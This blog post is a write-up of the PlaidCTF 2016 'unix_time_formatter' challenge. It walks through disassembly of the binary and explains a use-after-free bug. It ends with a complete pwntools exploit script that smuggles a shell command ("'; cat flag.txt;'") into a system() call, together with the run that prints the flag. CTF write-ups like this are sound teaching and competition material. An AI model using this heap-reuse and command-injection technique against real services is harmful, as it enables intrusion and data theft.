---
layout: post
title: "PlaidCTF - unix_time_formatter"
date: 2016-04-18 01:00
---

Last weekend was held the [PlaidCTF][plaidctf], as usual with high quality and very demanding challenges to solve. Here is a solution to the first pwn challenge `unix_time_formatter`.
<!--more-->

# Basic Information

From the organizers:

```plaintext
unix_time_formatter
Pwnable (76 pts)

Converting Unix time to a date is hard, so Mary wrote a tool to do so.

Can you you exploit it to get a shell? Running at unix.pwning.xxx:9999
```

This is a stripped ELF 64-bit binary with stack canaries and NX enabled:

```
$ file unix_time_formatter
unix_time_formatter: ELF 64-bit LSB executable, x86-64, version 1 (SYSV),
dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux
2.6.32, BuildID[sha1]=5afd38988c61546c0035e236ce938af6181e85a6, stripped

$ checksec --file unix_time_formatter
RELRO           STACK CANARY      NX            PIE             RPATH
Partial RELRO   Canary found      NX enabled    No PIE          No RPATH
RUNPATH      FILE
No RUNPATH   unix_time_formatter
```

# Operation

The binary is a simple user interface to the `date` command:

```
$ ./unix_time_formatter 
Welcome to Mary's Unix Time Formatter!
1) Set a time format.
2) Set a time.
3) Set a time zone.
4) Print your time.
5) Exit.
>
```

The main function is located at `0x400a70`, which prints the above menu and then select the action to do with a simple switch case:

```
0x00400aea      e837020000     call sub.fgets_d26
0x00400aef      ffc8           dec eax
0x00400af1      83f804         cmp eax, 4
0x00400af4      77a5           ja 0x400a9b
0x00400af6      ff24c5c01240.  jmp qword [rax*8 + 0x4012c0]
```

As a note, whenever there is a free or allocation done on the heap, the binary checks if the `DEBUG` environment variable is set to print debugging information.

## Set a time format

The function to set the format does the following:

* calls a function that I named `get_format`
* calls a function that I named `check_format`
* if everything is OK, stores the returned value in a global variable that I named here `FORMAT`

```
0x00400e00      53             push rbx
0x00400e01      bf12114000     mov edi, str.Format:
0x00400e06      e869ffffff     call get_format
0x00400e0b      4889c7         mov rdi, rax
0x00400e0e      4889c3         mov rbx, rax
0x00400e11      e89ffeffff     call check_format
0x00400e16      85c0           test eax, eax
0x00400e18      7514           jne 0x400e2e
0x00400e1a      bf1b114000     mov edi, str.Format_contains_invalid_characters.
0x00400e1f      e82cfbffff     call sym.imp.puts
0x00400e24      4889df         mov rdi, rbx
0x00400e27      e852feffff     call do_free
0x00400e2c      eb11           jmp 0x400e3f
0x00400e2e      bf3f114000     mov edi, str.Format_set.
0x00400e33      48891dde1220.  mov cs:FORMAT, rbx
0x00400e3a      e811fbffff     call sym.imp.puts
0x00400e3f      31c0           xor eax, eax
0x00400e41      5b             pop rbx
0x00400e42      c3             ret
```

The `check_format` function uses [`strspn`][strspn] to calculate the size of the first segment in the format that contains only whitelisted characters. If the size returned by `strspn` correspond to the size of the format, the function `check_format` returns `1`, otherwise `0`:

```
0x00400cb6      bedc104000     mov esi, str._aAbBcCdDeFgGhHIjklmNnNpPrRsStTuUVwWxXyYzZ:___0__
  ; "%aAbBcCdDeFgGhHIjklmNnNpPrRsStTuUVwWxXyYzZ:-_/0^# " @ 0x4010dc
0x00400cbb      4889fb         mov rbx, rdi
0x00400cbe      b933000000     mov ecx, 0x33
0x00400cc3      4883ec40       sub rsp, 0x40
0x00400cc7      488d7c2405     lea rdi, qword [rsp + 5]
0x00400ccc      f3a4           rep movsb byte [rdi], byte ptr [rsi]
0x00400cce      488d742405     lea rsi, qword [rsp + 5]
0x00400cd3      4889df         mov rdi, rbx
0x00400cd6      64488b042528.  mov rax, qword fs:[0x28]
0x00400cdf      4889442438     mov qword [rsp + 0x38], rax
0x00400ce4      31c0           xor eax, eax
0x00400ce6      e8c5fcffff     call sym.imp.strspn
0x00400ceb      4883c9ff       or rcx, 0xffffffffffffffff
0x00400cef      4889c2         mov rdx, rax
0x00400cf2      4889df         mov rdi, rbx
0x00400cf5      31c0           xor eax, eax
0x00400cf7      f2ae           repne scasb al, byte [rdi]
0x00400cf9      4889c8         mov rax, rcx
0x00400cfc      48f7d0         not rax
0x00400cff      48ffc8         dec rax
0x00400d02      4839c2         cmp rdx, rax
0x00400d05      0f94c0         sete al
0x00400d08      488b542438     mov rdx, qword [rsp + 0x38]
0x00400d0d      644833142528.  xor rdx, qword fs:[0x28]
0x00400d16      7405           je 0x400d1d
0x00400d18      e853fcffff     call sym.imp.__stack_chk_fail
0x00400d1d      4883c440       add rsp, 0x40
0x00400d21      0fb6c0         movzx eax, al
0x00400d24      5b             pop rbx
0x00400d25      c3             ret
```

## Set a time zone

The function to set the timezone does the same as the one to set the format, except that is does not use `strspn` to validate in the timezone. We might have a possibility to inject bad characters here:

```
0x00400e43      50             push rax
0x00400e44      bf4b114000     mov edi, str.Time_zone:
0x00400e49      e826ffffff     call get_format
0x00400e4e      bf57114000     mov edi, str.Time_zone_set.
0x00400e53      488905b61220.  mov cs:TZ, rax
0x00400e5a      e8f1faffff     call sym.imp.puts
0x00400e5f      31c0           xor eax, eax
0x00400e61      5a             pop rdx
0x00400e62      c3             ret
```

## Print your time

The functions to print the time does the following:

* Check if a format is set by checking if the global variable `FORMAT` is not null
* Set the value pointed by `TZ` in the environment variables with [`setenv`][setvenv]
* call [`system`][system] with `"/bin/date -d @%d +'%s'"` (`%d` is the time that we could have set and `%s` is the format that we have set).

```
0x00400ea3      4881ec180800.  sub rsp, 0x818
0x00400eaa      64488b042528.  mov rax, qword fs:[0x28]
0x00400eb3      488984240808.  mov qword [rsp + 0x808], rax
0x00400ebb      31c0           xor eax, eax
0x00400ebd      488b05541220.  mov rax, qword [rip + 0x201254]
0x00400ec4      4885c0         test rax, rax
0x00400ec7      750f           jne 0x400ed8
0x00400ec9      bfa2114000     mov edi, str.You_haven_t_specified_a_format_
0x00400ece      e87dfaffff     call sym.imp.puts
0x00400ed3      e995000000     jmp 0x400f6d
0x00400ed8      52             push rdx
0x00400ed9      50             push rax
0x00400eda      b900080000     mov ecx, 0x800
0x00400edf      448b0d3a1220.  mov r9d, dword [rip + 0x20123a]
0x00400ee6      41b8c2114000   mov r8d, str._bin_date__d___d____s_
0x00400eec      ba01000000     mov edx, 1
0x00400ef1      488d7c2418     lea rdi, qword [rsp + 0x18]
0x00400ef6      be00080000     mov esi, 0x800
0x00400efb      31c0           xor eax, eax
0x00400efd      e82efaffff     call sym.imp.__snprintf_chk
0x00400f02      bed9114000     mov esi, str.Your_formatted_time_is:
0x00400f07      bf01000000     mov edi, 1
0x00400f0c      31c0           xor eax, eax
0x00400f0e      e81dfbffff     call sym.imp.__printf_chk
0x00400f13      488b3dc61120.  mov rdi, qword [rip + 0x2011c6]
0x00400f1a      e8f1faffff     call sym.imp.fflush
0x00400f1f      bfbb104000     mov edi, str.DEBUG
0x00400f24      e8f7f9ffff     call sym.imp.getenv
0x00400f29      4885c0         test rax, rax
0x00400f2c      59             pop rcx
0x00400f2d      5e             pop rsi
0x00400f2e      741d           je 0x400f4d
0x00400f30      488b3dc91120.  mov rdi, qword [rip + 0x2011c9]
0x00400f37      488d4c2408     lea rcx, qword [rsp + 8]
0x00400f3c      baf2114000     mov edx, str.Running_command:__s_n
0x00400f41      be01000000     mov esi, 1
0x00400f46      31c0           xor eax, eax
0x00400f48      e803fbffff     call sym.imp.__fprintf_chk
0x00400f4d      488b35bc1120.  mov rsi, qword [rip + 0x2011bc]
0x00400f54      bf07124000     mov edi, 0x401207
0x00400f59      ba01000000     mov edx, 1
0x00400f5e      e8fdf9ffff     call sym.imp.setenv
0x00400f63      488d7c2408     lea rdi, qword [rsp + 8]
0x00400f68      e833faffff     call sym.imp.system
0x00400f6d      31c0           xor eax, eax
0x00400f6f      488b94240808.  mov rdx, qword [rsp + 0x808]
0x00400f77      644833142528.  xor rdx, qword fs:[0x28]
0x00400f80      7405           je 0x400f87
0x00400f82      e8e9f9ffff     call sym.imp.__stack_chk_fail
0x00400f87      4881c4180800.  add rsp, 0x818
0x00400f8e      c3             ret
```

As the timezone is not executed with `system` we can't inject a second command using a `;`. We need something else!

## Exit

The exit function is used to "gracefully" exit the program. The first thing it does, is to free both pointers stored in `FORMAT` and `TZ` (in that order), and then asks if we are sure to exit the program.

```
0x00400f8f      4883ec28       sub rsp, 0x28
0x00400f93      488b3d7e1120.  mov rdi, qword cs:FORMAT
0x00400f9a      64488b042528.  mov rax, qword fs:[0x28]
0x00400fa3      4889442418     mov qword [rsp + 0x18], rax
0x00400fa8      31c0           xor eax, eax
0x00400faa      e8cffcffff     call do_free
0x00400faf      488b3d5a1120.  mov rdi, cs:TZ
0x00400fb6      e8c3fcffff     call do_free
0x00400fbb      be0a124000     mov esi, str.Are_you_sure_you_want_to_exit__y_N__
0x00400fc0      bf01000000     mov edi, 1
0x00400fc5      31c0           xor eax, eax
0x00400fc7      e864faffff     call sym.imp.__printf_chk
0x00400fcc      488b3d0d1120.  mov rdi, qword [rip + 0x20110d]
0x00400fd3      e838faffff     call sym.imp.fflush
0x00400fd8      488b15111120.  mov rdx, qword [rip + 0x201111]
0x00400fdf      488d7c2408     lea rdi, qword [rsp + 8]
0x00400fe4      be10000000     mov esi, 0x10
0x00400fe9      e8f2f9ffff     call sym.imp.fgets
0x00400fee      8a542408       mov dl, byte [rsp + 8]
0x00400ff2      31c0           xor eax, eax
0x00400ff4      83e2df         and edx, 0xffffffdf
0x00400ff7      80fa59         cmp dl, 0x59
0x00400ffa      750f           jne 0x40100b
0x00400ffc      bf30124000     mov edi, str.OK__exiting.
0x00401001      e84af9ffff     call sym.imp.puts
0x00401006      b801000000     mov eax, 1
0x0040100b      488b4c2418     mov rcx, qword [rsp + 0x18]
0x00401010      6448330c2528.  xor rcx, qword fs:[0x28]
0x00401019      7405           je 0x401020
0x0040101b      e850f9ffff     call sym.imp.__stack_chk_fail
0x00401020      4883c428       add rsp, 0x28
0x00401024      c3             ret
```

# Vulnerability

To be able to execute arbitrary command through the `system` call, we need to be able to inject either a `;` or `&` in the `FORMAT`. To do that we can:

* allocate two strings for the timezone and format that are big enough to avoid being handled by the [fastbins] (in that order).
* Fake an exit to free both pointers. We will have [dangling pointers][dangling] in `TZ` and `FORMAT`.
* Set a new timezone. `malloc` will place it where the old timezone was. If the timezone is big enough we will be able to write on the `free`'d chunk that used to contain the format. In the timezone we can inject a command such as `ls -la`

# Payload

At first I tried to execute a shell, but it wasn't responding therefore I made a first payload to list the content of the current directory and then I modified it to read the content of the file containing the flag:

```
#!/usr/bin/env python2
# Please port pwntools to python3...
from pwn import *

r = remote('unix.pwning.xxx', 9999)
#r = remote('localhost', 9999)
# socat tcp-l:9999,reuseaddr,fork exec:./unix_time_formatter

def do_send(msg):
    print msg
    r.sendline(msg)

def do_recv(msg):
    print r.recvuntil(msg)

def do_it(r, s):
    do_recv(r)
    do_send(s)

do_recv('> ')
# Set a timezone
do_send('3') 
do_recv(': ')
do_send('A'*256)
do_recv('> ')
# Set a foramt
do_send('1')
do_recv(': ')
do_send('B'*256)
do_recv('> ')
# Exit
do_send('5')
do_recv('? ')
# Nope!
do_send('')
do_recv('> ')
# Set a timezone
do_send('3')
do_recv(': ')
# 256 bytes of padding to reach the beginning of the old format chunk
# 16 bytes to overwrite the chunk's header
# The command injection
do_send(' '*256+' '*16+"%H'; cat flag.txt;'")
do_recv('> ')
# Print the time
do_send('4')
do_recv('> ')
r.interactive()
```

Once executed:

```
[snip]

1) Set a time format.
2) Set a time.
3) Set a time zone.
4) Print your time.
5) Exit.
>

                                  %H'; cat flag.txt;'
Time zone set.
1) Set a time format.
2) Set a time.
3) Set a time zone.
4) Print your time.
5) Exit.
>
4
Your formatted time is: 00
PCTF{use_after_free_isnt_so_bad}
sh: 1: : Permission denied
1) Set a time format.
2) Set a time.
3) Set a time zone.
4) Print your time.
5) Exit.
>

```

Allways nullify a `free`'d pointer to avoid using it afterward!

[plaidctf]: http://www.plaidctf.com/
[strdup]: http://man7.org/linux/man-pages/man3/strdup.3.html
[strspn]: http://man7.org/linux/man-pages/man3/strspn.3.html
[setenv]: http://man7.org/linux/man-pages/man3/setenv.3.html
[system]: http://man7.org/linux/man-pages/man3/system.3.html
[fastbins]: http://man7.org/linux/man-pages/man3/mallopt.3.html
[dangling]: https://en.wikipedia.org/wiki/Dangling_pointer
